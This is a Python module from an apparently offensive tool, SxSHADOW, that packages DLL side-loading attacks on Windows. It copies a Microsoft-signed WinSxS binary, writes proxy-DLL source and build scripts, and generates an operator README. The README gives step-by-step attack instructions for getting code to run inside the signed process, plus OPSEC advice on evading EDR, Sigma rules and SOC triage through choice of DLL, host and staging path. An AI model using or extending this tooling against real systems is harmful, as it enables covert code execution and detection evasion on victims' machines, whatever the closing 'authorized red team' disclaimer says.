"""
SxSHADOW — output.packager
Creates a ready-to-deploy operator folder containing all artefacts needed
to execute the hijack:

  <output_dir>/<dll_stem>/
    README.txt          — step-by-step operator instructions
    <binary_name>       — copy of the WinSxS host binary
    <dll_stem>_proxy.c  — proxy DLL source
    <dll_stem>.def      — export DEF file
    build.bat           — Windows build script
    build.sh            — Linux cross-compile script

Operator workflow after package creation
-----------------------------------------
1. Run build.bat (or build.sh on Linux) to compile the proxy DLL.
2. Copy BOTH files (binary + DLL) to the staging path printed in README.txt.
3. Execute the copied binary.  The signed Microsoft process loads the proxy.
"""
from __future__ import annotations

import shutil
from dataclasses import dataclass, field
from pathlib import Path
from typing import List

from core import HijackCandidate
from forge import ProxyBundle


@dataclass
class DeploymentPackage:
    """A fully materialised operator deployment folder."""
    root: Path                          # e.g. ./output/mscorsvc/
    binary_copy: Path                   # copied WinSxS binary
    source_files: List[Path] = field(default_factory=list)
    readme: Path = Path("README.txt")

    def summary(self) -> str:
        lines = [
            "",
            "[SxSHADOW] Package written:",
            f"  Folder : {self.root}",
            f"  Binary : {self.binary_copy.name}",
            f"  Sources: {', '.join(f.name for f in self.source_files)}",
            f"  Readme : {self.readme.name}",
            "",
            "  Next steps:",
            "    1. cd into the folder and run build.bat (Windows) or build.sh (Linux).",
            "    2. Copy BOTH the binary and the compiled DLL to your staging path.",
            "    3. Execute the binary from the staging folder.",
        ]
        return "\n".join(lines)


def _write_readme(
    candidate: HijackCandidate,
    pkg_dir: Path,
    dll_stem: str,
) -> Path:
    target_dll = candidate.hijackable_dll
    binary     = candidate.binary_name
    staging    = candidate.suggested_drop_path
    real_src   = str(candidate.real_dll_path) if candidate.real_dll_path else "(not found — proxy will be a stub)"
    exports_n  = len(candidate.real_dll_exports)
    score      = candidate.score
    brk        = candidate.score_breakdown
    publisher  = candidate.binary_publisher or "(not collected)"
    bin_hash   = candidate.binary_sha256 or "(not collected)"
    dll_hash   = candidate.real_dll_sha256 or "(not collected)"
    dpri       = candidate.defensive_priority
    dbrk       = candidate.defensive_breakdown
    abused     = "YES — in hijacklibs corpus" if candidate.known_abused else "no"
    abused_warn = (
        "  ! This DLL is on hijacklibs.net.  Sigma and EDR vendors ship\n"
        "  ! detections for it.  Expect noisier telemetry and faster triage.\n"
        if candidate.known_abused else ""
    )

    content = f"""SxSHADOW Deployment Package
============================
Component Store Hijack Automated Discovery & Weaponization

Target binary : {binary}
Hijack DLL    : {target_dll}
Real DLL      : {real_src}
Exports       : {exports_n}
Score         : {score}/100  (trust={brk.get('trust',0)} ease={brk.get('ease',0)} impact={brk.get('impact',0)})
Architecture  : {candidate.binary_arch}
MS-Signed     : {candidate.binary_signed}
Publisher     : {publisher}
Host SHA-256  : {bin_hash}
Real-DLL SHA-256 : {dll_hash}
Component     : {candidate.component_name}  ({candidate.component_version})
Delay-loaded  : {candidate.delay_loaded}
Suggested path: {staging}

ATTACK STEPS
------------
Step 1 — Compile the proxy DLL
   Windows : double-click build.bat (or: build.bat msvc / build.bat mingw)
   Linux   : bash build.sh          (requires mingw-w64 cross-compiler)
   Output  : {target_dll}

Step 2 — Prepare the staging folder
   mkdir "{staging}"
   copy {dll_stem}_proxy compiled DLL to: {staging}\\{target_dll}
   copy {binary}          to: {staging}\\{binary}

Step 3 — Execute
   Run: {staging}\\{binary}
   The signed Microsoft binary searches for {target_dll} in its folder,
   finds your proxy, and loads it.  Your DllMain fires inside the signed
   process.  Trust transferred.

DETECTION AWARENESS
-------------------
Defensive priority : {dpri}/100  (known_abuse={dbrk.get('known_abuse',0)} stealth={dbrk.get('stealth',0)} exposure={dbrk.get('exposure',0)})
Known-abused DLL   : {abused}
{abused_warn}
What this means for you:
  • known_abuse > 0 — vendor and OSS rules (hijacklibs, Sigma corpus) already
    cover this DLL name on this host.  Assume image-load alerts are likely.
  • stealth — Microsoft-signed host + delay-load + LOLBin status.  Higher is
    quieter at the process-creation layer, but image-load telemetry still
    fires the moment {target_dll} loads from {staging}.
  • exposure — proxy is realistic AND simple to build.  A real DLL exists
    on disk, exports are few, so the proxy is reliable.

If 'Defensive priority' is high (>= 40) for this candidate, the SOC has
multiple cheap ways to catch it.  Consider:
  - A less well-known DLL (lower known_abuse score)
  - A non-LOLBin host (lowers stealth/exposure baselines for defenders)
  - A staging path the org doesn't already monitor

OPSEC NOTES
-----------
- {staging} mimics a legitimate installed-application path.
- The host binary ({binary}) is Microsoft-signed.  Process names in logs
  will show a known-good executable.
- The real {target_dll} still works because the proxy forwards all
  {exports_n} export(s) to the original DLL in System32.
- Do NOT drop payloads to %TEMP% — EDR and IR teams look there first.
- If 'delay_loaded: True', the proxy only fires when the first call to
  the imported function is made, not at process start.  Plan accordingly.
- Operator integrity: the SHA-256s above identify exactly the host and
  real-DLL bytes used to build this proxy.  Re-verify on the target host
  before staging — a Windows Update between scan and deploy can change
  the host PE and break export forwarding.

GENERATED BY SxSHADOW v1.0
Authorized red team use only.
"""
    readme_path = pkg_dir / "README.txt"
    readme_path.write_text(content, encoding="utf-8")
    return readme_path


def create_package(
    candidate: HijackCandidate,
    proxy_bundle: ProxyBundle,
    output_dir: Path,
) -> DeploymentPackage:
    """
    Materialise a complete DeploymentPackage on disk.

    Parameters
    ----------
    candidate:    The HijackCandidate being packaged.
    proxy_bundle: Generated proxy artefacts from forge_proxy().
    output_dir:   Parent directory; a sub-folder named after the DLL is created.

    Returns
    -------
    DeploymentPackage describing what was written.

    Raises
    ------
    FileNotFoundError if candidate.binary_path no longer exists
    (WinSxS was updated between scan and package creation).
    """
    if not candidate.binary_path.exists():
        raise FileNotFoundError(
            f"WinSxS binary no longer accessible: {candidate.binary_path}\n"
            "The component store may have been updated since the scan."
        )

    dll_stem = Path(candidate.hijackable_dll).stem
    pkg_dir  = output_dir / dll_stem
    pkg_dir.mkdir(parents=True, exist_ok=True)

    # 1. Write proxy source artefacts
    proxy_bundle.output_dir = pkg_dir
    source_files = proxy_bundle.write()

    # 2. Copy the WinSxS binary
    binary_dest = pkg_dir / candidate.binary_name
    shutil.copy2(candidate.binary_path, binary_dest)

    # 3. Write README
    readme = _write_readme(candidate, pkg_dir, dll_stem)

    return DeploymentPackage(
        root=pkg_dir,
        binary_copy=binary_dest,
        source_files=source_files,
        readme=readme,
    )
